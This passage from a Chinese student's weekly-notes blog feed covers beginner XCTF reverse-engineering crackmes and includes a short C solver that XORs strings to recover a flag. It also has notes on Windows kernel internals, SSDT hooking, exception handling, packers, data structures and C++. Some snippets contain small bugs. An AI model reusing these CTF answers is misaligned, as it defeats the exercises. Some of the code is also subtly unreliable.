class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag就是解出的hash值，没啥难度。（就是为了凑行数）</p>
<h2 id="第二个">第二个</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzcmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5077&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<p>就用16进制编辑器打开然后搜索“flag”</p>
<h1>写了个爬自己网易云红心歌单的爬虫</h1>
<p><a href="https://brubbish.github.io/53778.html">一个爬取自己网易云歌单的爬虫</a></p>
<p>其实还没写完</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.04-2020.05.10</title>
    <url>/12483.html</url>
    <content><![CDATA[<h1>攻防世界新手题</h1>
<h2 id="RE">RE</h2>
<h3 id="insanity">insanity</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzkmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5079&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<p>原来flag还能长&quot;9447{This_is_a_flag}&quot;这样…</p>
<span id="more"></span>
<h3 id="logmein">logmein</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzgmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5078&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400707 loc_400707:                             ; CODE XREF: main+177↓j</span><br><span class="line">.text:0000000000400707                 lea     rdi, [rbp+s]    ; s</span><br><span class="line">.text:000000000040070B                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:000000000040070F                 mov     [rbp+var_88], rax</span><br><span class="line">.text:0000000000400716                 call    _strlen</span><br><span class="line">.text:000000000040071B                 mov     rdi, [rbp+var_88]</span><br><span class="line">.text:0000000000400722                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400725                 jnb     loc_4007AC</span><br><span class="line">.text:000000000040072B                 lea     rdi, [rbp+var_20] ; s</span><br><span class="line">.text:000000000040072F                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400733                 mov     [rbp+var_90], rax</span><br><span class="line">.text:000000000040073A                 call    _strlen</span><br><span class="line">.text:000000000040073F                 mov     rdi, [rbp+var_90]</span><br><span class="line">.text:0000000000400746                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400749                 jb      loc_400754</span><br><span class="line">.text:000000000040074F                 call    sub_4007C0</span><br><span class="line">.text:0000000000400754 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400754</span><br><span class="line">.text:0000000000400754 loc_400754:                             ; CODE XREF: main+119↑j</span><br><span class="line">.text:0000000000400754                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400758                 mov     cl, [rbp+rax+var_20]</span><br><span class="line">.text:000000000040075C                 mov     [rbp+var_55], cl</span><br><span class="line">.text:000000000040075F                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:0000000000400762                 cdq</span><br><span class="line">.text:0000000000400763                 idiv    [rbp+var_2C]</span><br><span class="line">.text:0000000000400766                 movsxd  rsi, edx</span><br><span class="line">.text:0000000000400769                 mov     cl, byte ptr [rbp+rsi+var_28]</span><br><span class="line">.text:000000000040076D                 mov     [rbp+var_56], cl</span><br><span class="line">.text:0000000000400770                 movsx   edx, [rbp+var_55]</span><br><span class="line">.text:0000000000400774                 movsx   edi, [rbp+var_56]</span><br><span class="line">.text:0000000000400778                 xor     edx, edi</span><br><span class="line">.text:000000000040077A                 mov     cl, dl</span><br><span class="line">.text:000000000040077C                 mov     [rbp+var_57], cl</span><br><span class="line">.text:000000000040077F                 movsxd  rsi, [rbp+var_54]</span><br><span class="line">.text:0000000000400783                 movsx   edx, [rbp+rsi+s]</span><br><span class="line">.text:0000000000400788                 movsx   edi, [rbp+var_57]</span><br><span class="line">.text:000000000040078C                 cmp     edx, edi</span><br><span class="line">.text:000000000040078E                 jz      loc_400799</span><br><span class="line">.text:0000000000400794                 call    sub_4007C0</span><br><span class="line">.text:0000000000400799 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400799</span><br><span class="line">.text:0000000000400799 loc_400799:                             ; CODE XREF: main+15E↑j</span><br><span class="line">.text:0000000000400799                 jmp     $+5</span><br><span class="line">.text:000000000040079E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040079E</span><br><span class="line">.text:000000000040079E loc_40079E:                             ; CODE XREF: main:loc_400799↑j</span><br><span class="line">.text:000000000040079E                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:00000000004007A1                 add     eax, 1</span><br><span class="line">.text:00000000004007A4                 mov     [rbp+var_54], eax</span><br><span class="line">.text:00000000004007A7                 jmp     loc_400707</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps:<br>
CQD:<br>
把edx的所有位设成eax最高位的值</p>
</blockquote>
<p>在最后的“jmp     loc_400707”实现循环<br>
跳转到sub_4007C0后，就显示输入的密码错误</p>
<p>由于不会分析了 就 看了伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.\n&quot;</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;To continue, you must enter the correct password.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your guess: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%32s&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    sub_4007C0(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">  &#125;</span><br><span class="line">  sub_4007F0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中v7可以转换为16进制再转换成字符串，所以v7在运算时变为&quot;haramb&quot;<br>
得到flag的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> k1[]=<span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> k2[]=<span class="string">&quot;harambe&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">7</span>;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(k1);i++)&#123;</span><br><span class="line">		s[i]=(<span class="keyword">char</span>)(*(k2+i%a)^k1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="彦林学长给的一题">彦林学长给的一题</h3>
<p>题在这边：<span class="exturl" data-url="aHR0cHM6Ly96aGFuZ3NpLmxhbnpvdXMuY29tL2ljZnp4N2M=">easyYM<i class="fa fa-external-link-alt"></i></span><br>
看了他的wp<br>
嗯…感觉自己知道 有flag的那块地方没有被调用，但一方面是不知道是哪些函数跟flag有关（通过查看字符串）(后来用ida打开发现，放在main函数里，刚开始就跳过了） ，另外就是没有想到od设置某处为新eip的功能</p>
<h1>装Pwntools</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure>
<h1>数据结构</h1>
<h2 id="多重链表">多重链表</h2>
<ul>
<li>广义表<br>
广义表中的元素可以是一个单元素，也可以是另一个表。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Glist</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> tag;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    Element Type Data;  <span class="comment">//用这个标志控制结点为单元素或者广义表</span></span><br><span class="line">    Glist anlist;</span><br><span class="line">  &#125;</span><br><span class="line">  Glist Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>广义表即为一个多重链表<br>
多重链表中结点的指针域有多个（如anlist和Next）,包含两个指针域的链表不一定是多重链表(如双向链表)</p>
<h2 id="堆栈">堆栈</h2>
<p>数据对象集：有穷线性表<br>
操作集：堆栈的长度、堆栈元素</p>
<ol>
<li>生成长度为MaxSize的空堆栈</li>
<li>判断堆栈是否满了</li>
<li>将一个元素压入堆栈</li>
<li>判断堆栈是否为空</li>
<li>删除并返回栈顶元素<br>
栈的顺序存储结构由一个<strong>一位数组</strong>和一个<strong>记录栈顶位置</strong>的变量top组成</li>
</ol>
<h3 id="顺序存储">顺序存储</h3>
<h4 id="入栈">入栈</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top==MaxSize<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;堆栈满&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  s-&gt;data[s-&gt;top]=item;</span><br><span class="line">  (s-&gt;top)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="出栈">出栈</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top=<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;堆栈空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  data=s-&gt;data[(s-&gt;top)--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="链式存储">链式存储</h3>
<p>用一个单链表，称作链栈<br>
top在链表的头结点，头结点里不存放其他元素</p>
<h4 id="入栈-2">入栈</h4>
<p><img src="https://s1.ax1x.com/2020/05/08/Ynrdv6.png" alt="Ynrdv6.png"></p>
<h4 id="出栈-2">出栈</h4>
<p>记得free()<br>
<img src="https://s1.ax1x.com/2020/05/08/Ynr0KK.png" alt="Ynr0KK.png"></p>
<h2 id="队列">队列</h2>
<p>只能在一端插入（入队），在另一端删除（出队）<br>
先进先出</p>
<h3 id="顺序存储-2">顺序存储</h3>
<p>一个一维数组+一个记录头元素的变量front+一个记录尾元素的变量rear<br>
front指向第一个元素的前一个位置</p>
<ul>
<li>循环队列<br>
当front和rear相等时为空（或相等）（解决方案：加入一个额外标记；使用n-1个空间）</li>
</ul>
<p><img src="https://s1.ax1x.com/2020/05/08/YnrBDO.png" alt="YnrBDO.png"></p>
<h3 id="链式存储-2">链式存储</h3>
<p>存在单链表中，front和rear指针分别指向头和尾</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>数据结构</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.20-2020.04.26</title>
    <url>/45941.html</url>
    <content><![CDATA[<h1>Windows内核基础</h1>
<h2 id="内核理论基础">内核理论基础</h2>
<h3 id="Windows-r0和r3通信">Windows r0和r3通信</h3>
<p>当一个应用程序调用一个有关io的api，事实上这个api被封装在应用层的某个dll库文件中，dll动态库中函数调用的更底层的函数包含在ntdll.dll文件中。<br>
当应用层的某个api通过ntdll.dll里的native api执行时，会完成参数检查工作，再用一个中断指令从r3层进入r0层。</p>
<span id="more"></span> 
<p>ntdll.dll中的函数时成对出现的，分别以“nt”和“zw”开头，如ntcreatefile、zwcreatefile<br>
从用户模式调用nt* 和zw* api,连接ntdll.lib：<br>
  二者都是通过设置系统服务表中的索引和在栈中设置参数，通过sysenter或syscall指令进入内核态，并最终跳转到kiservicetable对应的系统服务例程中。代码会严格检查从用户空间传入的参数<br>
从内核模式调用nt* 和zw* api,连接ntdll.lib：<br>
  nt* api将直接调用对应函数，zw* api通过kisystemservice跳转到对应的函数代码<br>
调用nt* api时不会改变previous mode（分为用户态和内核态）的状态；调用zw* api时会将previous mode 改为内核态。使用zw* api可以避免额外的参数列表检查，提高效率</p>
<p>内核主要由各种驱动（在磁盘上时.sys文件）组成，有的是系统自带的，有的是软件厂商提供的。驱动加载后会生成对应的设备对象，并可以选择向r3提供一个可供访问和打开的符号链接<br>
应用层程序可以根据符号链接调用CreateFile()函数打开，在获得句柄后，程序就可以调用应用层函数与内核驱动进行通信<br>
  符号链接（软链接）：a symbolic link is a file that links to another file or directory using its path.然后大概是路径可以自动变的快捷方式…吧<br>
内核驱动执行DriverEntry()函数后就可以接受r3层的通信请求了。内核驱动中专门有一组函数用于响应应用层的调用请求</p>
<h3 id="内核函数">内核函数</h3>
<p>前缀：<br>
<img src="https://s1.ax1x.com/2020/04/24/JDmOoR.png" alt=" "></p>
<p>调用内核函数要注意它的中断请求级别（IRQL,Interrupt Request Level）要求。内核在不同情况下会运行在不同的IRQL级别上，此时必须调用符合该级别的内核函数</p>
<p><img src="https://s1.ax1x.com/2020/04/24/JD0lBd.png" alt=" "></p>
<p>passive_level：最低级别，对所有中断都可以做出响应，<strong>用户模式代码都运行在该中断级别上</strong>，可以访问分页内存<br>
apc_level：只有apc级别的中断可以被屏蔽，可以访问分页内存，分页调度管理就运行在该级别上<br>
dispatch_level:该级别和更低的中断被屏蔽，不能访问分页内存，只能处理不可分页的内存，因此在这个级别上能访问的api大大减少。线程调度运行在该级别上。线程调度用于执行多任务，由时钟中断来保证，因此该级别的中断即是调度中断。这个级别对一些严重中断不进行处理，所以要慎重使用（emmm…)<br>
DIRQL（Device IRQL）：IRQL的最高级别，在该级别上的中断都会被忽略，通常用于判断设备优先级</p>
<ul>
<li>分页内存：<br>
在保护模式中，内存访问使用分段机制，即&quot;段基址:段内偏移地址&quot;；操作系统将一些进程不常用的内存放到硬盘中，腾出内存空间，在一定程度上解决了内存不足的问题，但如果内存特别小，就会无法容纳任何一个进程的段。这个问题的原因是在只有分段的情况下，cpu认为线性地址等于物理地址，所以物理地址也必须要连续，但实际上可用的物理地址不连续。为了解决这个问题，需要让物理地址和线性地址重新建立映射，让前者不连续，后者连续，由此引出内存分页机制<br>
分页机制建立在分段机制的基础上，因此分页在分段后进行。在内存分页机制下，由“段基址:段内偏移地址”得到的线性地址不是物理地址而是虚拟地址，对应的物理地址要在页表中查找。<br>
分页机制提供连续线性地址到不连续物理地址的映射，以及用大小相等的页代替大小不相等的段</li>
</ul>
<h3 id="内核驱动模块">内核驱动模块</h3>
<p>内核驱动扩展名为.sys</p>
<ul>
<li>驱动的加载和执行<br>
创建一个服务（注册表），在services键下（…\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\）建立一个与驱动名称相关的服务键，服务键规定了驱动的一些属性，如加载的先后等<br>
对象管理器生成驱动对象，并传递给DriverEntry()函数，执行DriverEntry()函数。（DriverEntry()是驱动执行的入口函数）<br>
创建控制设备对象；创建控制设备符号链接；如果是过滤驱动，则创建过滤设备对象并绑定<br>
注册特定的分发派遣函数<br>
其他初始化动作，如hook、过滤（如文件过滤、防火墙过滤）等的注册和 初始化</li>
</ul>
<p> *过滤驱动就是挂载在其他驱动上，对某设备的irp(I/O Request Package)进行拦截过滤作用，可以对设备进行功能扩展，或是数据加密等的驱动程序。</p>
<h2 id="内核的数据结构">内核的数据结构</h2>
<h3 id="内核对象">内核对象</h3>
<p>内核对象是一种Windows内核中的数据结构管理机制。应用层的进程、线程、文件、等对象或打开的句柄在内核中都有对应的内核对象<br>
一个内核对象可以分为对象头和对象体。对象头中至少有一个OBJECT_HEADER和对象额外信息。对象体紧接着对象头中的OBJECT_HEADER。一个指针总是指向对象体而不是对象头，将对象体指针减去偏移值，获得OBJECT_HEADER的结构，从而访问其他对象结构辅助信息<br>
<img src="https://s1.ax1x.com/2020/04/26/JcAJKO.png" alt=" "><br>
内核对象分为：</p>
<ol>
<li>Dispatcher对象<br>
在对象体开始位置放置了一个共享的公共数据结构DISPATCHER_HEADER，包含了这个结构的内核对象名字都以K开头（但K开头的不一定都是这个对象），这些内核对象都是可以等待的（(waitable):①当到达某一个时间后，才继续线程的执行。/②当到达某一个时间后，调用某一个函数，而且间隔多少时间后，再次调用。）</li>
<li>io对象<br>
在开始位置不放置DISPATCHER_HEADER，但通常放置一个与type和size有关的整型成员。</li>
<li>其他对象<br>
包括进程对象(EPROCESS)和线程对象(ETHREAD)等<br>
EPROCESS用于管理进程的各种信息，每一个进程都对应一个EPROCESS结构，用于记录进程执行期间的各种数据。<br>
第一个成员是进程的对象KPROCESS，所有进程的EPROCESS内核结构都被放入一个双向链表，R3在枚举系统进程的时候，通过遍历这个链表获得了进程的列表</li>
</ol>
<p>ETHREAD结构是线程的内核管理对象，每一个线程都有一个对应的ETHREAD结构。结构的第一个成员是线程对象KTHREAD，所有的ETHREAD结构也被放在一个双向链表里<br>
<img src="https://s1.ax1x.com/2020/04/26/JcAYrD.png" alt=" "></p>
<h3 id="SSDT">SSDT</h3>
<p>“system services descriptor table”, 在内核中的实际名称是&quot;KeServiceDscriptorTable&quot;<br>
用于处理应用层通过Kernel32.dll下发的各个api操作请求。当kernel32.dll的api通过ntdll.dll时，会先完成对参数的检查，在调用一个中断，从而实现r3层进入r0层。</p>
<p>SSDT表中最重要的两个成员为ServiceTableBase（表的基地址）和NumberOfServices（系统中SSDT服务函数的个数）<br>
由ssdt表的基地址和ssdt函数的索引号可以求出对应的服务函数的地址（32位和64位计算公式不同）</p>
<h4 id="Shadow-SSDT">Shadow SSDT</h4>
<p>原理和SSDT类似，对应的表名为KeServiceDscriptorTable<strong>Shadow</strong>，是内核未导出（不能在自己的模块中导入和直接引用）的一张表，包含Ntoskrnel.exe和win32.sys服务函数。<br>
hook该表中的某些函数可以实现截屏保护、模拟按键、防止窗口被关闭等</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.11-2020.05.17</title>
    <url>/32652.html</url>
    <content><![CDATA[<h1>Windows下的异常处理</h1>
<p>操作系统处理程序错误或异常的一系列流程和技术的总称。主要有两种异常处理技术，SEH（结构化异常处理）和VEH（向量化异常处理）</p>
<h2 id="基本概念">基本概念</h2>
<p>中断是由外部硬件设备或异步事件产生的，异常是由内部事件产生的，可分为故障、陷阱、终止 3类。前两个是可恢复的，第三个是不可恢复的，系统必须重启</p>
<h3 id="异常列表">异常列表</h3>
<p><img src="https://s1.ax1x.com/2020/05/18/YfskvR.png" alt="YfskvR.png"><br>
由cpu引发的称为硬件异常，如访问一个无效的地址；由操作系统或程序引发的称为软件异常<br>
代码中可以用RaiseException()主动引发一个软件异常</p>
<span id="more"></span>  
<h3 id="异常处理的基本过程">异常处理的基本过程</h3>
<p>中断或异常发生时，cpu会通过中断描述符表（IDT）寻找处理函数。IDT是硬件和软件交接中断和异常的关口</p>
<h4 id="IDT">IDT</h4>
<p>IDT是一张位于物理内存中的线性表，共有256项，32位下每个项的长度是8字节，64位下每个项的长度是64字节。<br>
IDT的位置和长度是由cpu的IDTR寄存器描述的，IDTR共有84位，高32位为基址，低16位是表度长度。可以使用SIDT和LIDT指令读写该寄存器，LIDT只能在ring0下运行<br>
IDT的每一项都是一个门结构，包括：</p>
<ol>
<li>任务门描述符，用于cpu的任务切换</li>
<li>中断门，用于描述中断处理程序的入口</li>
<li>陷阱门，用于描述异常处理程序的入口</li>
</ol>
<p>用windbg的本地内核调试模式可以观察IDT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lkd&gt; !idt /a</span><br></pre></td></tr></table></figure>
<h4 id="异常处理的准备工作">异常处理的准备工作</h4>
<p><img src="https://s1.ax1x.com/2020/05/18/YfsVDx.png" alt="YfsVDx.png"><br>
当由异常或者中断发生时，cpu会根据中断类型号执行对应的中断处理程序。<br>
各个异常处理函数除了针对本异常的特定处理之外，通常会将异常信息进行封装。<br>
封装的内容中，一部分是异常记录，包含本次异常的信息，包括异常代码（异常产生的原因）、异常标志、异常发生的地址等；另一部分是陷阱帧，它精确的描述了发生异常时的线程状态，该结构与处理器有关，在不同平台上结构不同。<br>
封装后，异常处理函数会调用nt!KiDispatchException函数处理异常，</p>
<h4 id="内核态的异常处理过程">内核态的异常处理过程</h4>
<p>即当PreviousMode为KernelMode时。此时KiDispatchException会进行以下分发异常</p>
<ol>
<li>检测系统是否正在被内核调试器调试。如果内核调试器存在，系统就把异常处理的控制权转交给内核调试器。内核调试器取得控制权后会根据用户对异常处理的设置来确定是否要处理异常。如果处理了，那么异常的线程就会回到原来的位置继续执行；如果无法确定是否处理，就发生中断，由用户决定处理</li>
<li>如果不存在内核调试器，或者1中不处理该异常，系统将调用nt!RtlDispatchException,根据线程注册的结构化异常处理过程来处理</li>
<li>如果2时没有处理异常，系统会让内核调试器再次取得对异常的处理权</li>
<li>如果不存在内核调试器或3中调试器仍不处理，系统就认为不能继续运行了，会直接KeBugCheckEX,产生蓝屏错误<br>
在上述异常处理过程中，只有在某一步中异常没有处理才会进行下一个过程，只要异常被处理了，就会终止整个异常处理过程</li>
</ol>
<h4 id="用户态异常处理过程">用户态异常处理过程</h4>
<p>即当PreviousMode为UserMode时。此时KiDispatchException依然会检测内核调试器是否存在，如果存在就会优先把控制权交给内核调试器。多数情况下，内核调试器不处理用户态的异常，nt!KiDispatchException就会进行如下过程：</p>
<ol>
<li>如果发生异常的程序正在被调试，那么将异常信息发送给正在调试的用户态调试器；如果没有被调试就跳过这个步骤</li>
<li>如果没有被调试或调试器未处理异常，那么在栈上放置EXCEPTION_RECORD和CONTEXT两个结构，并将控制权返回用户态ntdll.dll中的KiUserExceptionDispatche函数，由它调用其它函数进行用户态的异常处理，这一部分涉及SEH和VEH两种处理机制。如果没有调试器能附加或调试器处理不了异常，系统就调用ExitProcess函数结束程序</li>
<li>如果2未能处理该异常，那么会再次回到nt!KiDispatchException,再次把异常信息发送给用户态的调试器，如果没有调试器则直接结束进程</li>
<li>如果3中调试器仍不处理，则nt!KiDispatchException再次把异常分发给进程的异常端口进行处理。该端口通常由子系统进程csrss.exe进行监听。子系统监听后会显示一个“应用程序错误”对话框。可以单击按钮，将其附加到调试器。如果没有调试器或者处理不了，则程序被终结</li>
<li>在终结程序之前，系统会再次调用发生异常的线程中的所有异常处理过程，这是线程异常处理过程中清理未释放资源的机会</li>
</ol>
<h1>C++</h1>
<p>按照http://c.biancheng.net/cplus/ 的顺序</p>
<h2 id="类和对象">类和对象</h2>
<p>在之前的周报中有记过<a href="https://brubbish.github.io/20849.html#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%88OOP%EF%BC%89%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%90%8D%E8%AF%8D">2020.03.30-2020.04.05</a>，现在忘了一些，再看一看，加深印象。<br>
 <br>
类可以看作 c 语言中结构体的升级版。<br>
类的成员不但可以是变量，还可以是函数,通过类定义出的变量叫做对象<br>
（也将类的成员变量称为属性，类的成员函数称为方法）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s的年龄是 %d，成绩是 %f\n&quot;</span>, name, age, score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> <span class="title">stu1</span>;</span></span><br><span class="line">stu1.name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">stu1.age = <span class="number">15</span>;</span><br><span class="line">stu1.score = <span class="number">92.5f</span>;</span><br><span class="line">stu1.<span class="built_in">say</span>();</span><br></pre></td></tr></table></figure>
<p>先用<strong>关键字</strong>class定义了一个<strong>类</strong>student，用这个类创建了一个<strong>对象</strong>stu1，后面这个过程叫做<strong>类的实例化</strong>，所以也称对象是类的一个<strong>实例</strong></p>
<p>在面向对象编程中，类由一组相关联的函数和变量组成，可以将一个或多个类放在一个源文件中，在使用时引入对应的类，调用需要的函数。</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.18-2020.05.25</title>
    <url>/33337.html</url>
    <content><![CDATA[<p>从上周开始不用写周报了<br>
感觉没有监督就懒散了23333</p>
<h1>壳</h1>
<p>附加在原始程序上，通过windows加载器载入内存后，先于原始程序执行，在执行过程中对原始程序进行解密、还原，还原后把控制权还给原始程序，执行原来的代码。可以防止程序文件被非法修改或者静态反编译<br>
许多木马和病毒都喜欢用壳来保护和隐藏自己。对一些流行的壳，杀毒引擎先对目标软件进行脱壳，再进行病毒检查；对大多数私人壳，杀毒软件不会开发解压引擎，而是直接当成木马或病毒处理，因此，商业软件出于兼容性的考虑，很少使用加壳保护，而在其他方面提高软件保护强度<br>
不同的外壳侧重方面不一样，有的侧重压缩，有的侧重加密，还有一些提供额外的功能，如注册机制、使用次数、时间限制等</p>
<span id="more"></span>
<h2 id="压缩引擎">压缩引擎</h2>
<p>一些加壳软件调用现成的压缩引擎对文件进行压缩，在选择压缩引擎时要保证解压速度快，这样加了壳的文件运行速度才不会受到太大影响</p>
<h3 id="压缩壳">压缩壳</h3>
<ol>
<li>upx</li>
<li>ASPack</li>
</ol>
<h3 id="加密壳">加密壳</h3>
<ol>
<li>ASProtect</li>
<li>Armadillo</li>
<li>EXECryptor</li>
<li>Themida</li>
</ol>
<h1>虚拟机保护</h1>
<p>许多解释性的语言，如java的jvm。这里讨论的虚拟机（与vmware不同）将一系列指令解释成字节码后放在一个解释引擎中执行，从而对软件进行保护。</p>
<h2 id="虚拟机引擎">虚拟机引擎</h2>
<p>一个虚拟机引擎由编译器、解释器和虚拟cpu组成，还会搭配一个或多个指令系统。虚拟机在运行时，现根据自定义的指令系统把已知的指令解释成字节码并放在pe文件中，然后将原始代码删除，改成直接进入虚拟机执行。<br>
挑事者跟踪并进入虚拟机后很难理解原始指令。想要理解程序就必须对虚拟机引擎进行分析<br>
